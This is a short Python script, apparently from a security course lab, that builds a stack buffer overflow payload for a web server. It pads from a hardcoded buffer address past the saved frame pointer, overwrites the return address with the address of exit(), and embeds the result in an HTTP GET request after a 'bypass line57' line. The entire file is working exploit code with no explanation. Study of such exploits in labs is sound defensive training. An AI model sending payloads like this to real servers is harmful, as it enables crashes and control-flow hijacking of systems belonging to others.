import struct
exit_addr = 0x7ffff78a9dd0
buf_addr = 0x7ffffffea020
rbp = 0x7ffffffec020
pad = "a" * (rbp - buf_addr + 8)
jmp = struct.pack("<Q", exit_addr)
exploit_str = pad + jmp
req = "GET / HTTP/1.0 \r\n" + "bypass line57\n" + exploit_str + "\n" + "\r\n"
print(req)
